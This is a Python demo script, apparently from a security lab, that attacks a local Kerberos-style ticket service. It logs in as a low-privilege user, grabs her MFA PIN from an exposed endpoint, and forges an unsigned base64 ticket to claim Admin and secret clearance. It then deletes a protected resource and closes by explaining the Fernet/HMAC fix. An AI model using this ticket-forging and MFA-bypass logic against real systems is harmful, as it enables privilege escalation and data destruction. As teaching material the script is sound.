import sys
import json
import time
import uuid
import base64
import requests

BASE = "http://localhost:5000"

RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"


def banner():
    print(f"\n{BOLD}{CYAN}{'═'*64}")
    print("  ATTACK 2 — TICKET TAMPERING")
    print(f"{'═'*64}{RESET}")


def vuln(msg): print(f"  {RED}[VULN]  {msg}{RESET}")
def info(msg): print(f"  {YELLOW}[INFO]  {msg}{RESET}")
def step(msg): print(f"\n  {BOLD}» {msg}{RESET}")
def show(k, v): print(f"     {CYAN}{k:<32}{RESET}{v}")
def boom(msg): print(f"\n  {BOLD}{RED}💥 EXPLOITED: {msg}{RESET}")
def safe(msg): print(f"\n  {BOLD}{GREEN}✓  BLOCKED:   {msg}{RESET}")


def decode_ticket(token: str) -> dict:
    """
    Attempt to decode a ticket as plain base64(JSON).
    In the VULNERABLE build this succeeds — tickets have no encryption.
    In the SECURE build this raises an exception — tickets are Fernet-encrypted.
    """
    pad = 4 - len(token) % 4
    raw = base64.urlsafe_b64decode((token + ("=" * pad if pad != 4 else "")).encode())
    return json.loads(raw)


def forge_ticket(token: str, overrides: dict) -> str:
    """
    Try to forge a ticket.

    VULNERABLE build: tokens are plain base64(JSON) → decode, patch, re-encode.
    SECURE build:     tokens are Fernet ciphertext → can't decode, so attacker
                      falls back to bit-flipping / truncating the ciphertext.
                      Fernet's HMAC-SHA256 detects any modification → InvalidToken.
    """
    try:
        data = decode_ticket(token)
        data.update(overrides)
        forged = base64.urlsafe_b64encode(
            json.dumps(data, separators=(",", ":")).encode()
        ).decode()
        info("Ticket decoded as plain base64 JSON — VULNERABLE build detected")
        return forged
    except Exception:
        # Secure build: ticket is Fernet-encrypted; attacker corrupts ciphertext bytes
        info("Cannot decode ticket (Fernet-encrypted) — falling back to byte corruption")
        corrupted = token[:-8] + "XXXXXXXX"
        return corrupted


def auth_headers(service_ticket: str) -> dict:
    return {
        "X-Service-Ticket":          service_ticket,
        "X-Authenticator-Nonce":     str(uuid.uuid4()),
        "X-Authenticator-Timestamp": str(time.time()),
        "X-Hour-Override":           "10",   # force business hours
    }


def mfa_login(username: str, password: str) -> str:
    """2-step MFA-aware login. Returns TGT token or exits on failure."""
    r1 = requests.post(f"{BASE}/login", json={"username": username, "password": password})
    if not r1.ok:
        print(f"{RED}  Login step-1 failed: {r1.json()}{RESET}")
        sys.exit(1)

    body1 = r1.json()
    if "tgt" in body1:
        return body1["tgt"]

    if not body1.get("mfa_required"):
        print(f"{RED}  Unexpected login response: {body1}{RESET}")
        sys.exit(1)

    info("MFA required — fetching PIN from /mfa/pending …")
    pin = None
    for _ in range(15):
        time.sleep(0.2)
        try:
            rp = requests.get(f"{BASE}/mfa/pending", timeout=2)
            for entry in rp.json().get("pending", []):
                if entry["username"] == username:
                    pin = entry["pin"]
                    break
        except Exception:
            pass
        if pin:
            break

    if not pin:
        print(f"{RED}  Could not retrieve MFA PIN for '{username}'{RESET}")
        sys.exit(1)

    show("MFA PIN retrieved:", pin)
    r2 = requests.post(f"{BASE}/login/mfa", json={"username": username, "pin": pin})
    if not r2.ok:
        print(f"{RED}  MFA step-2 failed: {r2.json()}{RESET}")
        sys.exit(1)
    return r2.json()["tgt"]


def main():
    banner()

    vuln("Tickets are plain base64(JSON) — no encryption, no HMAC signature.")
    vuln("An attacker decodes, edits any field, re-encodes — server accepts it.")

    # Check server is up
    try:
        requests.get(f"{BASE}/health", timeout=3)
    except requests.ConnectionError:
        print(f"\n{RED}  Cannot connect to {BASE} — run: python app.py{RESET}")
        sys.exit(1)

    # Step 1: Login as carol (MFA-aware)
    step("Step 1: carol (Employee / HR / public clearance) logs in and gets a ticket")
    tgt = mfa_login("carol", "Employee@2024")

    # Get a service ticket
    r = requests.post(f"{BASE}/request-ticket", json={
        "tgt":           tgt,
        "service":       "resource_server",
        "authenticator": {"nonce": str(uuid.uuid4()), "timestamp": time.time()},
    })
    token = r.json()["service_ticket"]

    # Show original ticket contents (only possible if plain base64 — vulnerable build)
    step("Step 2: Attacker tries to decode the ticket as plain base64 JSON")
    try:
        orig = decode_ticket(token)
        show("Original role:",       orig["role"])
        show("Original clearance:",  orig["clearance"])
        show("Original department:", orig["department"])
        ticket_readable = True
    except Exception:
        info(f"Token prefix: {token[:40]}...")
        show("Decode result:", f"{GREEN}FAILED — ticket is Fernet-encrypted (AES + HMAC){RESET}")
        ticket_readable = False

    # Step 3: Forge / corrupt the ticket
    step("Step 3: Attacker forges or corrupts the ticket and tries DELETE IT-001")
    forged = forge_ticket(token, {
        "role":       "Admin",
        "clearance":  "secret",
        "department": "IT",
    })
    if ticket_readable:
        try:
            fdata = decode_ticket(forged)
            show("Forged role:",       f"{RED}{fdata['role']}{RESET}")
            show("Forged clearance:",  f"{RED}{fdata['clearance']}{RESET}")
            show("Forged department:", f"{RED}{fdata['department']}{RESET}")
        except Exception:
            pass
    else:
        show("Forged token (corrupted):", f"{forged[:40]}…{RED}XXXXXXXX{RESET}")

    info("carol's real ticket: Employee / HR / public — should be completely blocked")
    info("Forged/corrupted:    Admin / IT / secret    — should never be accepted")

    r_delete = requests.delete(f"{BASE}/resource/IT-001", headers=auth_headers(forged))
    show("DELETE /resource/IT-001:", f"HTTP {r_delete.status_code}")

    if r_delete.ok:
        boom("Forged ticket accepted — carol became Admin and deleted a secret IT resource!")
        info(f"Server response: {r_delete.json().get('message', '')}")
    else:
        safe(f"Forged ticket rejected: {r_delete.json().get('reason', r_delete.json().get('error', ''))}")

    step("Root Cause & Fix")
    info("File:  security.py → encrypt_ticket() / decrypt_ticket()")
    info("Bug:   encrypt_ticket() ignores the key and just does base64(JSON).")
    info("       decrypt_ticket() does no integrity verification.")
    info("Fix:   Use Fernet (AES-128-CBC + HMAC-SHA256) from the cryptography library.")
    info("       Any modification invalidates the MAC → InvalidToken is raised.")
    print()


if __name__ == "__main__":
    main()